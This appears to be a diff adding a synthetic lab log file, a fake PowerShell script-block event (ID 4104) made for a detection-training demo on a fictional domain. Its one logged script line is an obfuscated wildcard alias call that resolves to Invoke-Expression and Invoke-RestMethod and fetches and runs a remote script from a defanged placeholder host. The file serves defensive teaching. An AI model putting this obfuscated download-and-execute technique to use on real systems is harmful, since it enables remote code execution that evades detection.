@@ -1,0 +1,29 @@
+================================================================================
+SYNTHETIC LAB TELEMETRY — NOT A REAL INCIDENT
+Reproduces: STEEP#MAVERICK-style wildcard Get-Alias -> Invoke-Expression /
+            Invoke-RestMethod pattern (the T1027.010 motivating finding).
+Environment: fictional lab domain contoso-corp.test. All hostnames, usernames,
+and the destination URL below are placeholders. The URL is defanged
+(hxxp[://]) and points at a reserved .test domain that does not resolve.
+Analysis:    see 01-wildcard-getalias-iex-notes.md (raw log only below —
+             safe to display in full during a live demo before revealing it)
+================================================================================
+
+Log Name:       Microsoft-Windows-PowerShell/Operational
+EventID:        4104
+TimeCreated:    2026-08-11T14:02:07.209Z
+Computer:       WKSTN17.contoso-corp.test
+Channel:        Microsoft-Windows-PowerShell/Operational
+Level:          Warning
+UserID:         CONTOSO-CORP\j.alvarez
+ProcessId:      6820
+ScriptBlockId:  2c9cb3d7-2609-4b6f-ae94-6bb780d86f62
+Path:
+MessageNumber:  1
+MessageTotal:   1
+ScriptBlockText:
+.(gal ?e[?x])((gal ?rm) 'hxxp[://]cdn-sync-relay[.]test/lib/mod2.ps1')
+
+================================================================================
+END OF RAW LOG EXCERPT
+================================================================================
